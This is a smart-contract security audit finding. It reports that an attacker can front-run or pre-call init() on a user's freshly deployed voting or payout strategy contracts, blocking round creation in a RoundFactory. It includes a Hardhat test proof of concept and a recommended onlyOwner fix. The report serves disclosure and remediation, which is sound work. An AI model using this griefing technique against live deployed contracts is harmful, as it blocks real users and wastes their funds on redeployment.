# [M] - Denial of Service attack is possible when a round contract is created from roundFactory

## Summary

The creation of round from roundFactory is prone to DOS attacks.
Since the payoutStrategy and votingStrategy are created in separate transactions
DOS attacks can be possibly be done in the following two ways, let's take Alice(the real user) and bob(attacker) here:-
1. After alice deploys the votingStrategy, bob finds about this and initilizes the contract by calling the `init()` function. And when Alice calls the `create()` function in roundFactory contract, it fails. Alice would need to redeploy a new Votingstrategy contract and do the process all over again.
2. Alice deploys both votingStrategy and payoutStrategy contracts, and then proceeds to call the `create()` from roundFactory. Bob finds this transaction in the mempool. Calls his own version of `create()` with the contract address of votingStrategy and payoutStrategy from alice, He pays more in gas and frontruns the transaction and succeeds. Alice's tx will fail and will have to redeploy both the contracts.

## Vulnerability Detail

Here's the POC for the first possible DOS attack that can be done by an attacker:
```javascript
it.only("Possible DOS attack when user creates a roundImplementation contract", async () => {
        let deployer: SignerWithAddress;
        let alice: SignerWithAddress;
        let attacker: SignerWithAddress;

        [deployer, alice, attacker] = await ethers.getSigners();

        roundContractFactory = await ethers.getContractFactory('RoundFactory');
        roundFactory = <RoundFactory>await upgrades.deployProxy(roundContractFactory);

        await roundFactory.updateAlloSettings(alloSettings.address);
        await roundFactory.updateRoundImplementation(roundImplementation.address);

        // Deploy Factory
        const quadraticFundingVotingStrategyContractFactory = await ethers.getContractFactory('QuadraticFundingVotingStrategyFactory');
        const quadraticFundingVotingStrategyFactory = <QuadraticFundingVotingStrategyFactory>await upgrades.deployProxy(quadraticFundingVotingStrategyContractFactory);

        // Deploy QuadraticFundingVotingStrategyImplementation contract
        const quadraticFundingVotingStrategyImplementationArtifact = await artifacts.readArtifact('QuadraticFundingVotingStrategyImplementation');
        const quadraticFundingVotingStrategyImplementation = <QuadraticFundingVotingStrategyImplementation>await deployContract(user, quadraticFundingVotingStrategyImplementationArtifact, []);
        
        await quadraticFundingVotingStrategyFactory.updateVotingContract(quadraticFundingVotingStrategyImplementation.address);
        // // Alice creates the voting strategy contract from the Factory
        const tx = await quadraticFundingVotingStrategyFactory.connect(alice).create();
        
        const receipt = await tx.wait();

        let votingContractAddress;
        let votingImplementation;
        
        if (receipt.events) {
          const event = receipt.events.find(e => e.event === 'VotingContractCreated');
          if (event && event.args) {            
            
            votingContractAddress = event.args.votingContractAddress;
            votingImplementation = event.args.votingImplementation;
          }
        }

        const votingStrategyContract = await ethers.getContractAt('QuadraticFundingVotingStrategyImplementation', votingContractAddress);

        // Attacker finds this and calls the init function
        await votingStrategyContract.connect(attacker).init();
        
        // Alice does not know this and wants to create a round with this votingStrategy contract that she just created
        const initAddress = [
          votingStrategyContract.address, // votingStrategy
          payoutStrategy.address, // payoutStrategy
        ];

        const initRoundTime = [
          _currentBlockTimestamp + 100, // applicationsStartTime
          _currentBlockTimestamp + 250, // applicationsEndTime
          _currentBlockTimestamp + 500, // roundStartTime
          _currentBlockTimestamp + 1000, // roundEndTime
        ];

        const initMetaPtr = [
          { protocol: 1, pointer: "bafybeia4khbew3r2mkflyn7nzlvfzcb3qpfeftz5ivpzfwn77ollj47gqi" }, // roundMetaPtr
          { protocol: 1, pointer: "bafybeiaoakfoxjwi2kwh43djbmomroiryvhv5cetg74fbtzwef7hzzvrnq" }, // applicationMetaPtr
        ];

        const initRoles = [
          [ alice.address ], // adminRoles
          [ Wallet.createRandom().address, Wallet.createRandom().address ] // roundOperators
        ];

        params = [
          initAddress,
          initRoundTime,
          matchAmount,
          token,
          roundFeePercentage,
          roundFeeAddress,
          initMetaPtr,
          initRoles
        ];

        const txn = roundFactory.connect(alice).create(
          encodeRoundParameters(params),
          alice.address,
        );

        // Alice won't be able to create the round and would need to redeply the votingStrategy contract again
        await expect(txn).to.revertedWith("init: roundAddress already set");

      })
```

## Impact

User won't be able to create a new round contract because of this. This attack is going to be cheap especially on the fantom network.
Also, attackers can also steal your payout strategy and voting strategy contracts helping them save some gas when deploying on ethereum mainnet.

## Tool used
Manual review, Hardhat

## Recommendation

To ensure maximum security, it is recommended to create a function with the onlyOwner modifier in both the payoutStrategy and votingStrategy contracts. This function can be used by the owner to manually add the round address to the contracts.
